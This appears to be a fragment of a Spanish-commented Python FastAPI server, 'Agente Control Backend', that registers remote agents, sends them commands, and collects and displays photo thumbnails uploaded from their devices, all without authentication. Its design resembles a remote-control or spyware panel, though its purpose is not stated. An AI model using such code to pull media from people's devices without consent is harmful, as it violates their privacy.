import json
import base64
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any

# --- INICIALIZACIÓN ---
app = FastAPI(title="Agente Control Backend (vFINAL)")
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

# --- "BASE DE DATOS" EN MEMORIA ---
connected_agents: Dict[str, Dict[str, Any]] = {}
# La caché ahora es un dict de dicts para buscar por nombre de archivo
device_media_cache: Dict[str, Dict[str, Any]] = {}

# --- MODELOS DE DATOS MODIFICADOS ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str = ""

class Thumbnail(BaseModel):
    filename: str
    small_thumb_b64: str  # Campo para la miniatura pequeña
    large_thumb_b64: str  # Campo para la vista previa grande

class ThumbnailChunk(BaseModel):
    thumbnails: List[Thumbnail]
    is_final_chunk: bool

# --- ENDPOINTS WEBSOCKET Y DE COMANDOS (Sin Cambios) ---
# ... (Tu @app.websocket, @app.get("/api/get-agents"), y @app.post("/api/send-command") se quedan igual) ...

# --- RUTA DE RECEPCIÓN DE LOTES (Modificada para guardar todo) ---
@app.post("/api/submit_media_chunk/{device_id}")
async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
    if device_id not in connected_agents:
        return {"status": "error", "message": "Agente no registrado."}
    
    if device_id not in device_media_cache:
        device_media_cache[device_id] = {}

    # Guardamos el diccionario completo del thumbnail en la caché, usando el filename como clave
    for thumb in chunk.thumbnails:
        device_media_cache[device_id][thumb.filename] = thumb.dict()
    
    print(f"Recibido lote de {len(chunk.thumbnails)} de {device_id[:8]}. Total en caché: {len(device_media_cache.get(device_id, {}))}")

    if chunk.is_final_chunk:
        print(f"Recepción completada para {device_id[:8]}.")

    return {"status": "chunk received"}


# --- RUTA PARA EL PANEL (Modificada para enviar solo lo necesario) ---
@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    cache = device_media_cache.get(device_id, {})
    # Devolvemos solo la lista de miniaturas PEQUEÑAS para que el panel cargue rápido
    return [{"filename": data["filename"], "small_thumb_b64": data["small_thumb_b64"]} for data in cache.values()]


# --- ¡NUEVA RUTA PARA SERVIR LA IMAGEN GRANDE AL NAVEGADOR! ---
@app.get("/media/{device_id}/{filename:path}")
async def get_large_media(device_id: str, filename: str):
    cache = device_media_cache.get(device_id, {})
    media_item = cache.get(filename)
    
    if not media_item or 'large_thumb_b64' not in media_item:
        return Response(content="Archivo no encontrado en la caché", status_code=404)
    
    try:
        # Decodificamos el Base64 de la imagen GRANDE a bytes
        image_bytes = base64.b64decode(media_item['large_thumb_b64'])
        
        # Devolvemos los bytes directamente con el tipo de contenido correcto (JPEG)
        # Esto le dice al navegador: "Esto es una imagen, muéstrala como tal"
        return Response(content=image_bytes, media_type="image/jpeg")
    except Exception as e:
        print(f"Error al decodificar o servir imagen grande: {e}")
        return Response(content="Error al procesar la imagen", status_code=500)
